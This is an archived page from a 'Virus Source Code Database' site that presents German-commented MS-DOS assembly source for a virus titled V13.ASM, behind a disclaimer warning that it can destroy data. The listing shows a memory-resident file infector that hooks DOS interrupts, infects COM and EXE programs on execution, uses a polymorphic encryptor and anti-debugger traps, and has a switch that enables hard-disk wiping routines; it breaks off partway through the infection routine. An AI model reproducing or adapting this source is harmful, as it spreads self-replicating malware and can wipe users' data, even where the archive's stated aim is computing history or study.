<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

            TITLE V13.ASM

;------------------------------------------------------------------------------
; Assembler-Optionen:
;------------------------------------------------------------------------------
            NOSMART     ;Optimierung AUS (keine krummen Sachen)!

                        ;<-- Mit AN oder AUS ein- bzw. ausschalten !!!
SCHARF      EQU AN      ;Debugger-Fallen & Trigger-Funktion AN oder AUS !!!
ZERSTOER    EQU AN      ;Wenn ZERSTOER=AN ist, dann werden auch die Routinen
                        ;zum HD-Lîschen eingebunden (INT 13H) !!!
;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ INCLUDE-Dateien:                                                           ≥
;≥----------------------------------------------------------------------------≥
;≥ FUNKTION: Verschidene Macros zur VerfÅgiung stellen.                       ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
            INCLUDE CODER.INC       ;Polymorpher Codierer
            INCLUDE DOS.INC         ;DOS-Aufrufe
            INCLUDE EQU.INC         ;EQU-Vereinbarungen
            INCLUDE RND.INC         ;Zufallsgenerator
            INCLUDE TSR.INC         ;TSR-Funktionen
            INCLUDE VAR.INC         ;Variablendefinitionen
            INCLUDE VIRMACS.INC     ;Virus-Funktionen

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ DOSE:                                                                      ≥
;≥----------------------------------------------------------------------------≥
;≥ FUNKTION: Standardaufruf von DOS, kann im Hauptprog durch Neudefinition    ≥
;≥           geÑndert werden.                                                 ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
DOSE        MACRO

            INT 21H

            ENDM

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ HOST:                                                                      ≥
;≥----------------------------------------------------------------------------≥
;≥ FUNKTION: Simuliertes HOST-Programm:                                       ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

HOST        SEGMENT PARA
            ASSUME CS:HOST,DS:HOST,ES:HOST,SS:STAPEL

;------------------------------------------------------------------------------
HOST_BEG    EQU $                        ;Start des Hosts
;------------------------------------------------------------------------------
START:      MOV BP,0                     ;Wird normalerweise im Coder gesetzt
            MOV AX,SEG VIRUS             ;Differenz zwischen Virus-Stack
            SUB AX,SEG STAPEL            ;und Virus-Programm berechnen und
            MOV WORD PTR CS:[ALT_SS],AX  ;in den Virus patchen
            MOV AX,SEG VIRUS             ;Differenz zwischen Virus-Host
            SUB AX,SEG HOST              ;und Virus-Programm berechnen und
            MOV WORD PTR CS:[EXE_SEG],AX ;fÅr RÅcksprung in den Virus patchen
            JMP FAR PTR MAIN             ;Sprung zum Virus
EXIT:       DOS_END 0                    ;Prog mit ENDE-Code 0 beenden
;------------------------------------------------------------------------------
HOST_END    EQU $                        ;Ende vom Host
;------------------------------------------------------------------------------
HOST        ENDS

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ STAPEL:                                                                    ≥
;≥----------------------------------------------------------------------------≥
;≥ Stacksegment fÅr das Host-Programm (s.o.):                                 ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
STAPEL      SEGMENT PARA STACK

DB          64 DUP (0)                   ;Stack soll 64 Bytes gro· sein
STACKEND    EQU $                        ;Ende (aus der sicht des Stacks:
                                         ;START!) des Stacks...
STAPEL      ENDS

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ VIRUS:                                                                     ≥
;≥----------------------------------------------------------------------------≥
;≥ Segment mit dem Virus-Code:                                                ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
VIRUS       SEGMENT PARA
            ASSUME CS:VIRUS,DS:VIRUS,ES:VIRUS

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ MAIN:                                                                      ≥
;≥----------------------------------------------------------------------------≥
;≥ Nicht-Residenter teil des Virus:                                           ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
MAIN        PROC NEAR

CRYP_STRT:  PUSH DS ;<DS> (und damit auch <ES>) auf dem Stack sichern!

            IF SCHARF

              DEB_TEST_C1                       ;Counter-Test 1
              SAVE_DEB_VEC                      ;Vector-Tisch ZÑhler

            ENDIF
;------------------------------------------------------------------------------

            PUSH CS     ;Wenn SCHARF definiert wurde, dann werden bei Wanze
            POP DS      ;aus der SCHIEBE CS eine öberlaufunterbrechung
                        ;geben einen Sprung
            PUSH DS     ;zu GOODBYE !!!
            POP ES      ;<DS> und <ES> auf <CS> setzen...
            CLD         ;Stringmanipulation aufsteigend

;------------------------------------------------------------------------------
; COM oder EXE-Strategie:
;------------------------------------------------------------------------------
            CMP BYTE PTR CS:[OFFSET COMEXE+BP],1 ;COM oder EXE?
            JZ EXE_STRT                          ;--> EXE-Start

;------------------------------------------------------------------------------
; COM: Start-BYTES des Hostprogs restaurieren, rÅcksprung setzen:
;------------------------------------------------------------------------------
            MOV WORD PTR CS:[HOST_SEG+BP],CS    ;SEG auf <CS>

            LEA SI,COM_START[BP]                ;<SI> mit Adresse des orig-COM
            MOV DI,100H                         ;Ziel auf den COM-Start
            MOV CX,3                            ;3 DurchlÑufe
            REP MOVSB                           ;Kopieren!
            JMP TEST_DEB                        ;--> TEST_DEB

;------------------------------------------------------------------------------
; EXE: RÅcksprung zum Host vorbereiten:
;------------------------------------------------------------------------------
EXE_STRT:   MOV AX,CS              ;Aktuelles <CS>
EXE_SEG     EQU $+1                ;EXE_SEG auf die 0 von SUB AX,0
            SUB AX,0               ;RÅcksprung vorbereiten (SEG)
            MOV CS:[HOST_SEG],AX   ;Diff zw. Virus und Host

;------------------------------------------------------------------------------
TEST_DEB    EQU $                  ;Diverse Tests

            IF SCHARF
              WANZEN_CHECK_C1                   ;S.O.
            ENDIF

            INST_TEST ID_WORD,ENDE              ;Schon drin? JA --> ENDE
;------------------------------------------------------------------------------
; Resident MACHEN des Virus:
;------------------------------------------------------------------------------
            DOS_GETMEM MEM_ALLOC,AX             ;Block reserviren
            JNC ALLOC_OK                        ;KEIN FEHLER --> ALLOC_OK

;------------------------------------------------------------------------------
; Vom HOST-Programm Speicher klauen:
;------------------------------------------------------------------------------
            POP AX                              ;<DS> vom STACK in <AX>
            PUSH AX                             ;<DS> wieder sichern
            DEC AX                              ;<ES> auf den MCB
            MOV ES,AX                           ;zeigen lassen
            MOV BX,WORD PTR ES:[MCB_SIZE]       ;Grî·e des Blocks ermitteln
            SUB BX,MEM_ALLOC+1                  ;Block weniger MEM_ALLOC
            POP ES                              ;<ES> auf <DS>
            PUSH ES                             ;<DS> wieder sichern
            MOV AH,4AH                          ;Blockgrî·e Ñndern, <BX>=neue
            DOSE                                ;Grî·e, <ES>=SEG des RAM-Blocks
            JC F_ENDE                           ;FEHLER --> ENDE
            DOS_GETMEM MEM_ALLOC,AX             ;Block reserviren
            JNC ALLOC_OK                        ;OK --> ALLOK_OK
F_ENDE:     JMP ENDE                            ;FEHLER --> ENDE

;------------------------------------------------------------------------------
; PSP-Eintrag (verfÅgbarer Speicher) des Hosts aktualisieren:
;------------------------------------------------------------------------------
ALLOC_OK:   SUB WORD PTR ES:[PSP_MEM],MEM_ALLOC+1 ;Hostblock minus Virus

;------------------------------------------------------------------------------
; Virus in den SPEICHER kopieren:
;------------------------------------------------------------------------------
            MOV ES,AX              ;<ES> auf den neuen Block
            MOV SI,BP              ;Quell-OFS: [DS:SI]
            XOR DI,DI              ;Ziel-OFS: [ES:DI]
            MOV CX,ANZBYTES        ;ANZBYTES DurchlÑufe!
            REP MOVSB              ;Kopieren!

;------------------------------------------------------------------------------
; BLOCK als belegt kennzeichnen / Aktiv auf NICHT Aktiv setzen!:
;------------------------------------------------------------------------------
            DEC AX                              ;<AX>: OFS-Block --> OFS-MCB
            MOV DS,AX                           ;<DS> auf MCB des neuen Blocks
            MOV WORD PTR DS:[MCB_PSP],8         ;Block=belegt (DOS)
            CLR_AKTIV ES:[AKTIV]                ;Aktiv-FLAG auf Null!!!

            IF SCHARF
              PUSH ES                        ;<ES> merken
              MOV AX,WORD PTR CS:[DIE_ID+BP] ;Overflow-Werte in <AX>
              MUL AX                         ;Und den Overflow setzen (INTO!!!)
              PUSH AX                        ;------------------------------
              CALL NEU21                     ;Routine abgearbeitet und <ES>
              POP AX                         ;wird nicht wieder restauriert.
              LES DI,[BP+OFFSET DIE_ID]      ;INTO wird somoit notwendig fÅr
NO_GOODY      EQU $                          ;den Programmablauf !!!
            ENDIF
;------------------------------------------------------------------------------

            RNDINIT ES:[INITWERT]               ;RND-Init-Werte speichern

;------------------------------------------------------------------------------
; Vektoren umbiegen:
;------------------------------------------------------------------------------
            PUSH ES                             ;<DS> auf den neuen Block
            POP DS                              ;setzen (<ES> retten).

            DOS_GETINT 13H,DS:[ALT13]           ;Vektor von INT 13H --> ALT13
            DOS_GETINT 21H,DS:[ALT21]           ;Vektor von INT 21H --> ALT21

;------------------------------------------------------------------------------
; INT 21H umbiegen:
;------------------------------------------------------------------------------
; Aufruf von INT 21H ƒƒ> Vektor zeigt auf das 5.BYTE des ersten MCB ƒƒ> JMP
; ƒƒ> Sprung zum eigentlichen Virus... INT 21H zeigt somit in den 1. MCB
;------------------------------------------------------------------------------
            MOV AH,52H                          ;DOS INFORMATION BLOCK (DIB)
            DOSE                                ;ermitteln, undokumentiert.
            MOV AX,ES                           ;<ES> in <AX>
            DEC AX                              ;<AX> verkleinern
            MOV ES,AX                           ;<ES> somit verkleinert!
            ADD BX,12                           ;OFS auf den ersten MCB
            LES BX,ES:[BX]                      ;Erste MCB in <ES>/<BX>
                                                ;OFS auf das 1. ungenuzte BYTE
            ADD BX,5                            ;im MCB.
            MOV BYTE PTR ES:[BX],0EAH           ;Direct JMP
            MOV WORD PTR ES:[BX+1],OFFSET NEU21 ;OFS setzen
            MOV WORD PTR ES:[BX+3],DS           ;SEG setzen!

;------------------------------------------------------------------------------
            XOR AX,AX                           ;<DS> wieder...
            MOV DS,AX                           ;...auf SEG 0
            MOV WORD PTR DS:[21H*4+2],ES        ;SEG fÅr INT 21H biegen
            MOV WORD PTR DS:[21H*4],BX          ;OFS fÅr INT 21H biegen

ENDE        EQU $

            IF SCHARF
              CLI
              SAUERKRAUT            ;Creiere Sauerkraut-Code 
              STI                   ;(siehe Spaghetti-Code im SURIV.EXE)
            ENDIF
;------------------------------------------------------------------------------

            POP DS                  ;<DS> und <ES> restaurieren
            PUSH DS                 ;<--- (s.o.)
            POP ES                  ;<--- (s.o.)

            CMP BYTE PTR CS:[OFFSET COMEXE+BP],1 ;COM oder EXE?
            JNZ HOST_START                       ;COM --> gleich zum Host
;------------------------------------------------------------------------------
; Nur bei EXE-Programm: Stack-Regs wieder auf original-Werte setzen
;------------------------------------------------------------------------------
            CLI                     ;keine Unterbrechung bei Stack-énderungen !
ALT_SP      EQU $+1                 ;hier wird der alte <SP>-reingepatcht
            MOV SP,OFFSET STACKEND  ;Original <SP> des EXE-Hosts wieder setzen
            MOV AX,CS               ;Berechnung des original <SS>
ALT_SS      EQU $+1                 ;hier wird die <SS>-Differenz reingepatcht
            SUB AX,0                ;Original <SS> berechnen
            MOV SS,AX               ;und setzen
            STI                     ;Interrupts wieder zulassen
;------------------------------------------------------------------------------
; RÅcksprung zum Host (COM oder EXE --> siehe oben):
;------------------------------------------------------------------------------
HOST_START: DB 0EAH                 ;Direct Intersegment-JMP
HOST_JMP    EQU $                   ;Label wird fÅr Debugger-Test benîtigt
HOST_OFS    DW OFFSET EXIT          ;OFS-ADR zum Prog-Beenden
HOST_SEG    DW ?                    ;SEG-ADR zum Host

MAIN        ENDP

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ DOSE:                                                                      ≥
;≥----------------------------------------------------------------------------≥
;≥ FUNKTION: Standardaufruf von DOS, kann im Hauptprog durch Neudefinition    ≥
;≥           geÑndert werden.                                                 ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
DOSE        MACRO

            CALL GODOS

            ENDM

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ NEU21:                                                                     ≥
;≥----------------------------------------------------------------------------≥
;≥ Neuer INT 21H (Dos-Calls) Handler.                                         ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ
NEU21       PROC FAR

            SET_INST ID_WORD                    ;Virus schon resident.
            TEST_AKTIV CS:[AKTIV],END21         ;Virus aktiv? NEIN --> END21

;------------------------------------------------------------------------------
; EXEC oder OPEN oder WRITE ?
;------------------------------------------------------------------------------
            PUSHALL                    ;REGs sichern
;------------------------------------------------------------------------------
            PUSH AX                    ;DOS-Funktionsnummer auf den Stack
            MOV BP,SP                  ;Mit <BP> direkt auf den Stack zugreifen
            XOR WORD PTR SS:[BP],1313H ;Funktionsnummer verschlÅsseln (XORen)
            MOV BP,SS:[BP]             ;VerchlÅsselte Funktionsnummer in <BP>
            POP AX                     ;Stack wieder reparieren. <AX> ist jetzt
                                       ;wie <BP> mit 1313h verschlÅsselt...
;------------------------------------------------------------------------------
            CMP BP,(4B00H XOR 1313H)   ;EXEC-Funktionsnummer ?
;------------------------------------------------------------------------------
            JNE END21POP               ;NEIN --> END21POP

;------------------------------------------------------------------------------
GO_INF:     FNAME_TEST DS,DX,CS:[SCAN],ANZ_SCAN,END21POP ;FNamen testen
;------------------------------------------------------------------------------
            JMP START_ME                                 ;--> START_ME

;------------------------------------------------------------------------------
; INT 21H-Virus beenden:
;------------------------------------------------------------------------------
END21POP:   POPALL                              ;Register laden
;------------------------------------------------------------------------------
END21:      CLR_AKTIV CS:[AKTIV]                ;Handler nicht mehr aktiv.
            DB 0EAH                             ;Direct Intersegment Jmp...
ALT21       DD ?                                ;RÅcksprung zum INT 21H

;⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø
;≥ START_ME:                                                                  ≥
;≥----------------------------------------------------------------------------≥
;≥ File infizieren.                                                           ≥
;¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ

;------------------------------------------------------------------------------
; Block reservieren:
;------------------------------------------------------------------------------
START_ME:   DOS_GETMEM ((ANZBYTES+0FH)/10H),BP  ;Speicherblock, SEG-Adr in <BP>
            JC END21POP                         ;FEHLER --> END21POP

;------------------------------------------------------------------------------
; Vektoren auf den Stack schieben:
;------------------------------------------------------------------------------
            DOS_GETINT 24H,ES,BX                ;Vektor von INT 24 lesen
            PUSH_SEGOFS ES,BX                   ;[SEG:OFS] vom Vektor sichern
            MOV AL,13H                          ;Vektor von INT 13 lesen
            DOSE                                ;Regs noch durch DOS_GETINT ok!
            PUSH_SEGOFS ES,BX                   ;[SEG:OFS] vom Vektor sichern
;------------------------------------------------------------------------------
            PUSH_SEGOFS DS,DX                   ;[SEG:OFS] des FNamens pushen

;------------------------------------------------------------------------------
; Vektoren umbiegen:
;------------------------------------------------------------------------------
            XOR AX,AX                            ;<DS> auf SEG-0
            MOV DS,AX                            ;Zugriff auf INT-Vectoren:

            MOV WORD PTR DS:[24H*4],OFFSET NEU24 ;INT 24H neu setzten
            MOV WORD PTR DS:[24H*4+2],CS

            MOV AX,WORD PTR CS:[ALT13]           ;INT 13H auf den Wert biegen,
            MOV WORD PTR DS:[13H*4],AX           ;auf dem INT 13H vor resident-
            MOV AX,WORD PTR CS:[ALT13+2]         ;machen des Virus stand...
            MOV DS:[13H*4+2],AX                  ;ANTIVIR-Progs tÑuschen ???

;------------------------------------------------------------------------------
; Attribut lesen und neu schreiben:
;------------------------------------------------------------------------------
            POP_SEGOFS DS,DX                    ;[SEG:OFS] des FNamens zurÅck!
            DOS_GETATTR DS,DX,SI                ;Attrubut ermitteln
            JC REST_FAR                         ;FEHLER --> REST_INT
            DOS_SETATTR 0,DS,DX                 ;Attribut einer Datei setzen
            JNC ATTR_OK                         ;OK --> ATTR_OK
REST_FAR:   JMP REST_INT                        ;FEHLER --> REST_INT
ATTR_OK:    PUSH SI                             ;Attribut auf den Stack
            PUSH_SEGOFS DS,DX                   ;[SEG:OFS] des FNamens pushen

;------------------------------------------------------------------------------
; Datei îffnen:
;------------------------------------------------------------------------------
            DOS_FOPEN DS,DX,12H,BX              ;File îffnen (Handle in <BX>)
            JNC IS_OFFEN                        ;OK --> IS_OFFEN
            JMP BREAK                           ;FEHLER --> BREAK
IS_OFFEN:   PUSH CS                             ;Nebenbei
            POP DS                              ;<DS> auf <CS> setzen

;------------------------------------------------------------------------------
; Altes DATUM und alte ZEIT merken:
;------------------------------------------------------------------------------
            DOS_FGETIME BX,CX,DX                ;Lezte Modifikation der Datei
            JNC ID_TEST                         ;FEHLER --> CLOSE

N_CLOSE:    POP DX                              ;Datum und Zeit vom Stack
            POP CX
            JMP CLOSE                           ;FEHLER -->  CLOSE

ID_TEST:    PUSH CX                             ;Uhrzeit merken
            PUSH DX                             ;Datum merken

;------------------------------------------------------------------------------
; ID_WORD  testen (keine Doppelinfektion!):
;------------------------------------------------------------------------------
            DOS_FSEEK BX,2,0FFFFH,(-2)              ;FPtr aufs Fileende-2
            JC N_CLOSE                              ;zurÅcksetzen.
            DOS_FREAD BX,2,DS,<OFFSET PUFFER>       ;Datei einlesen (ID_WORD?)
            JC N_CLOSE                              ;FEHLER --> CLOSE

            MOV AL,BYTE PTR CS:[PUFFER]         ;1. Byte des ID_WORDS?
            ADD AL,BYTE PTR CS:[PUFFER+1]       ;2. Byte des ID_WORDS?
            CMP AL,ID_SUM                       ;Wenn JA --> AL=ID_SUM!
            JZ N_CLOSE                          ;ID_SUM erkannt --> CLOSE

;------------------------------------------------------------------------------
; Ersten 18H BYTEs des Hosts merken:
;------------------------------------------------------------------------------
READ_IT:    CALL SEEK_BEG                       ;FPtr auf Anfang
            JC N_CLOSE                          ;FEHLER --> CLOSE
            DOS_FREAD BX,18H,DS,<OFFSET PUFFER> ;Ersten 18H Bytes
            JC N_CLOSE                          ;FEHLER --> CLOSE

;------------------------------------------------------------------------------
; LÑnge einlesen und merken / Dateizeiger auf den Anfang:
;------------------------------------------------------------------------------
            DOS_FSEEK BX,2,0,0,DI,SI            ;Aufs Ende, LÑnge in <DS:SI>!
            JC N_CLOSE                          ;FEHLER --> CLOSE
            CALL SEEK_BEG                       ;Dateizeiger auf den Anfang
            JC N_CLOSE                          ;FEHLER --> N_CLOSE --> CLOSE

            CMP WORD PTR CS:[PUFFER],"ZM"       ;EXE-Datei? ("MZ")
            JZ EXE_BP                           ;JA --> EXE_BP

;------------------------------------------------------------------------------
; COM (INIT!):
;------------------------------------------------------------------------------
            CMP SI,MAXGR                        ;Datei zu gro·?
            JAE N_CLOSE                         ;JA --> TO_BIG
            MOV WORD PTR CS:[SET_BP],SI         ;<IP> ermitteln!
            ADD WORD PTR CS:[SET_BP],100H       ;COM-Start drauf!
            MOV BYTE PTR CS:[COMEXE],0          ;COMEXE auf COM
;------------------------------------------------------------------------------
            MOV WORD PTR CS:[OFFSET HOST_OFS],100H
;------------------------------------------------------------------------------
            ADD SI,OFFSET CODE_BUF-3             ;Adresse des Coders
            MOV BYTE PTR CS:[COM_MERK],0E9H      ;JMP setzen
            MOV WORD PTR CS:[COM_MERK+1],SI      ;(im CODER-Puffer)
            DOS_FWRITE BX,3,DS,<OFFSET COM_MERK> ;Datei beschreiben
            JNC F_INFECT                         ;--> F_INFECT -->
F_MODIFY:   JMP MODIFY                           ;FEHLER --> MODIFY
F_INFECT:   XOR DI,DI                            ;LO-OFS des FilePtr
            JMP CODE_GEN

EXE_BP:     MOV WORD PTR CS:[SET_BP],0          ;<IP> ist immer 0!
            MOV BYTE PTR CS:[COMEXE],1          ;COMEXE auf EXE

;------------------------------------------------------------------------------
; Neue VerschlÅsselungsroutine aufbauen:
;-------------------------------------------------------------------------------
CODE_GEN:   MOV ES,BP                           ;ES auf das Crypt-Segment
            PUSH BX                             ;Handle sichern
            PUSH DI                             ;HI-Datei-LÑnge sichern
            PUSH SI                             ;LO-Datei-LÑnhe sichern
;------------------------------------------------------------------------------
            COD_GEN ES,CODE_BUF,CS:[SET_BP],DI
;------------------------------------------------------------------------------
            INC DI                              ;2 Bytes lÑnger=ID_WORD
            INC DI                              ;...und nochmal
            MOV WORD PTR CS:[PATCH_SIZE],DI     ;LÑnge nun in PATCH_SIZE

            POP SI                              ;HI-Datei-LÑnge zurÅck
            POP DI                              ;LO-Datei-LÑnhe zurÅck
            POP BX                              ;Handle zurÅck

            MOV BP,ES                           ;SEG des Blocks in <BP>

;------------------------------------------------------------------------------
; COM oder EXE..????
;------------------------------------------------------------------------------
            CMP BYTE PTR CS:[COMEXE],1          ;EXE-Datei? (1)
            JZ GO_EXE                           ;JA --> GO_EXE
            JMP INFECT                          ;--> INFECT

;------------------------------------------------------------------------------
